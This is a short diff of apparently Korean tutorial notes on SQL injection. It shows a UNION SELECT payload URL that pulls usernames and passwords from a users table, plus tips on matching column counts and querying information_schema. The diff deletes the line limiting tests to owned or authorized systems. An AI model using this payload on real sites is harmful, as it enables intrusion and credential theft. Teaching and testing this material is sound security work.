@@ -50,4 +50,3 @@ http://target/page.php?id=1 UNION SELECT null, username, password FROM users--
 
 - UNION은 컬럼 수를 정확히 맞춰야 한다. 하나씩 맞춰가며 시도한다.
 - DB의 `information_schema`에서 테이블/컬럼을 조회한다.
-- 모든 테스트는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.
